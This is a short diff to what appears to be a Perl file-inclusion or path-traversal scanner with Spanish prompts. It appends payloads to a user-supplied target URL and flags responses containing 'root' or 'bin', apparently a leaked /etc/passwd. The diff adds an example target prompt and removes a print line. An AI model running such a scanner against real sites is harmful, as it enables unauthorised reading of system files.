@@ -4,6 +4,7 @@
 # 9:58 a.m
 use LWP::Simple;
 print "\n";
+print "[!]Example : www.target.com/php.id= \n\n";
 print "Introduce tu URL \n";
 $patra = <STDIN>;
 chomp($patra);
@@ -24,7 +25,6 @@ foreach $payasa(@payload){
 	$newurl = $patra.$payasa;
 
 	$pagina_codigo = LWP::Simple::get($newurl);
-	print "$academ";
 
 if ( $pagina_codigo =~ /root/ ||
 	 $pagina_codigo =~ /bin/  ){
